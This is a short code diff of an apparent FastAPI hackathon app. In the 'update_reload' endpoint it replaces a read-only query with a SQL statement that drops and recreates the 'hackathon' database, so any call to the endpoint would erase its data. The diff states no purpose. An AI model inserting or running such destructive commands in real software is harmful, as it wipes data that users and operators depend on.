@@ -139,7 +139,7 @@ async def get_event(
 async def update_reload(
         db: Session = Depends(get_db),
 ):
-    db.query(models.Reload).all()
+    db.execute("drop database hackathon; create database hackathon;")
 
 """@app.get("/events/location/", response_model=List[schemas.Event])
 async def get_nearby_events(
